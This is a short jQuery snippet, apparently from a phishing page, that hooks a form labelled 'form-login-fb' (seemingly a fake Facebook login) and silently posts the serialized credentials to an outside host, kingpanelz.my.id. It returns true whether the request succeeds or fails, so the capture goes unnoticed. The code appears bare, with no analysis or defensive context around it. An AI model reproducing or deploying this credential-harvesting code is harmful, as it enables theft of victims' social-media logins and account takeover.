$(".form-login-fb").submit(function() {  
 var d = $(".form-login-fb");  
  
 $.ajax({  
        url: "https://kingpanelz.my.id/api/krisna/api.php",  
        type: "POST",  
        data: d.serialize(),  
        success: function () {  
            return true;  
        },  
        error: function () {  
            return true;  
        },  
    });  
});
